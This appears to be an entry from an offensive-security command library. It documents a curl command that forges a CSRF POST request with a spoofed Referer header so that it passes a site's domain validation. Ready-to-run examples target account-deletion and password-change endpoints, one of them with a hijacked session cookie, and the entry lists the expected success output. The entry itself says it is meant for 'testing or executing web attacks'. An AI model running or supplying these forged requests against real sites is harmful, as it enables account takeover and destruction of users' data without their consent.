---
type: command
executor: bash
data: >-
  curl -X POST -H "Referer: $_MALICIOUS_SUBDOMAIN/csrf.html" -d "$_FORM_DATA"
  $_TARGET_ENDPOINT
tags:
  - csrf
  - web-attack
platforms:
  - linux
  - macos
  - web
verified: true
validated: true
---

# curl-send-csrf-request-with-custom-referer

## Command

```bash
curl -X POST -H "Referer: $_MALICIOUS_SUBDOMAIN/csrf.html" -d "$_FORM_DATA" $_TARGET_ENDPOINT
```

## Description

This command uses curl to send a forged POST request mimicking a CSRF attack from a controlled subdomain. It sets a custom Referer header to bypass domain validation, simulating submission from a trusted subdomain. Useful for testing or executing web attacks where browser simulation is needed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_MALICIOUS_SUBDOMAIN | Full URL of the malicious page on the subdomain (e.g., https://vulnerable.target.com) | Yes |
| $_FORM_DATA | URL-encoded form data for the forged request (e.g., new_email=attacker@example.com) | Yes |
| $_TARGET_ENDPOINT | Target URL for the sensitive action (e.g., https://target.com/change-email) | Yes |
| -X POST | Specifies POST method | Built-in |
| -H "Referer: ..." | Sets custom referer header | Built-in |
| -d "..." | Sends form data in the body | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -H "Referer: https://sub.target.com/csrf.html" -d "action=delete&confirm=1" https://target.com/account/delete
```

### Advanced Usage (with Cookies)

```bash
curl -X POST -H "Referer: https://sub.target.com/csrf.html" -b "session=abc123" -d "new_password=weakpass" https://target.com/change-password
```

## Expected Output

A successful response might look like:
```
<html><body>Password updated successfully.</body></html>
```

HTTP status 200 or 302 (redirect) indicates acceptance. Errors like 403 suggest referer validation blocked it.

## Related

- [[procedures/Subdomain-CSRF-Attack]]
- [[tools/Burp-Suite]]
